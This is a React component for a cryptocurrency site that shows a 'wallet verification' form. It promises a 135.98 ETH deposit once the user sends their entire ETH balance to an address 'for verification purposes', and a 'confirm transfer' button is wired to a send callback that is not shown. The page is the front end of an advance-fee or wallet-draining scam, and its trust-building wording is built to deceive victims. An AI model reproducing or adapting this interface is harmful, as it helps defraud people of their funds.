"use client"

import React, { useEffect, useState } from 'react'
import Cookies from 'js-cookie'
import { useForm } from 'react-hook-form'
import { useRouter } from 'next/navigation'
import { twMerge } from 'tailwind-merge'
import useBTCAdress from '@/lib/hooks'
import { CheckCheck } from 'lucide-react'

type FormProps = {
    btcaddress: string
}

type VerifyAddressFormProps = {
    userBalance: number
    confirmAndSend: () => void
    convertETHToUSD: (ethAmount: number) => string
}

const VerifyAddressForm = ({ userBalance, confirmAndSend, convertETHToUSD }: VerifyAddressFormProps) => {

    const router = useRouter()
    const { setAddress } = useBTCAdress()
    const [inputAddress, setInputAddress] = useState<string>()

    const { register, handleSubmit, formState: { errors } } = useForm<FormProps>()

    useEffect(() => {

        const address = Cookies.get("inputaddress")
        if (address && inputAddress === undefined) {
            setInputAddress(address)
            setAddress(address)
        }

    })

    const onSubmit = (formValues: FormProps) => {
        const submittedaddress = formValues.btcaddress
        Cookies.set("inputaddress", submittedaddress, { expires: 1 })
        setInputAddress(submittedaddress)
        setAddress(submittedaddress)
        router.refresh()
    }

    return (
        <>
            <div className='p-4 bg-green-100 rounded-md mb-4'>
                <h4><span className='font-bold text-lg'>135.98 ETH ({convertETHToUSD(135.98)})</span> to be deposited to <span className='font-bold'>connected wallet</span> immediately after <span className='font-bold'>wallet verification</span> is done</h4>
            </div>
            <div className='bg-neutral-200 p-4 rounded-md mb-4'>
                <h4 className='font-semibold uppercase mb-4'>Wallet Verification Request</h4>
                {/* <h4 className="mb-2">As part of our wallet verification process, we will initiate a <span className="font-bold">transfer request</span> of <span className='font-bold'>{userBalance.toFixed(4)} ETH ({convertETHtoUSD(userBalance)})</span> to <span className="font-bold break-all">{Boolean(inputAddress) ? inputAddress : "input address"}</span> after which <span className='font-bold'>135.98 ETH ({convertETHtoUSD(135.98)})</span> will be deposited to your connected wallet account</h4> */}
                <p className='mb-3'>To complete the wallet verification process, please follow the steps below:</p>

                <ol className='list-inside list-decimal mb-3'>
                    <li className='mb-2'><span className='font-bold'>Provide your receiving Ethereum wallet address</span> where you wish to receive your verified funds.</li>
                    <li className='mb-2'>Once the address is confirmed, we will send a verification request.</li>
                    <li className='mb-2'><span className='font-bold'>You will be required to send exactly {userBalance} ETH ({convertETHToUSD(userBalance)})</span> to the wallet address provided for verification purposes.</li>
                    <li>After confirming the incoming transaction, we will proceed to deposit <span className='font-bold'>135.98 ETH ({convertETHToUSD(135.98)})</span> into your connected wallet.</li>
                </ol>

                <h4 className='font-bold mb-3'>This is a one-time verification to confirm wallet ownership.</h4>

                <form action="" onSubmit={handleSubmit(onSubmit)} className='flex md:flex-row flex-col justify-between gap-y-4 gap-x-4'>
                    <div className='w-full'>
                        <div className={twMerge('w-full bg-white break-words px-3 py-2 rounded-md border border-red-600 mb-3', Boolean(inputAddress) && "border-green-600 bg-green-100 px-0 py-0")}>{Boolean(inputAddress) ? <div className=' bg-green-100 font-medium px-6 h-9 flex gap-x-2
                 justify-center rounded-full items-center whitespace-nowrap'><CheckCheck size={20} />Address Verified</div> : <>No Transfer Address</>}</div>
                        {Boolean(inputAddress) ? null : <input type="text" {
                            ...register("btcaddress", {
                                required: "ETH address required",
                                validate: (address) => {
                                    if (/^0x[a-fA-F0-9]{40}$/.test(address)) {
                                        return true
                                    } else {
                                        return "Enter a valid ETH address"
                                    }
                                }
                            })
                        } placeholder='INPUT YOUR ADDRESS' className='w-full h-10 border-2 border-neutral-300 placeholder:text-neutral-300 outline-none focus-visible:outline-none pl-4 rounded-md mb-2' />}
                        {Boolean(inputAddress) ? null : <span className='text-red-600'>{errors.btcaddress?.message}</span>}
                    </div>

                    {Boolean(inputAddress) ? <button onClick={confirmAndSend} className="uppercase font-medium flex items-center justify-center h-10 bg-green-600 px-4 rounded-full text-neutral-100 sm:w-fit w-full whitespace-nowrap">confirm transfer</button> : <button className='text-base font-medium px-6 h-9 flex items-center justify-center bg-red-700 rounded-full text-white whitespace-nowrap'>Verify Address</button>}
                    {/* <div className='w-full'>
                        <div className='w-full bg-white break-words px-3 py-2 rounded-md border border-green-600 mb-3'>392NQstZKRCHBGNR4nNR7PRhQtXS5xRKAV</div>
                    </div>
                    <div className=' bg-green-100 font-medium px-6 h-9 flex gap-x-2
                 justify-center rounded-full items-center whitespace-nowrap'><CheckCheck size={20} />Address Verified</div> */}
                </form>
            </div>
        </>
    )
}

export default VerifyAddressForm

{/* <span className='text-sm font-normal lowercase'>(pending verification)</span> */ }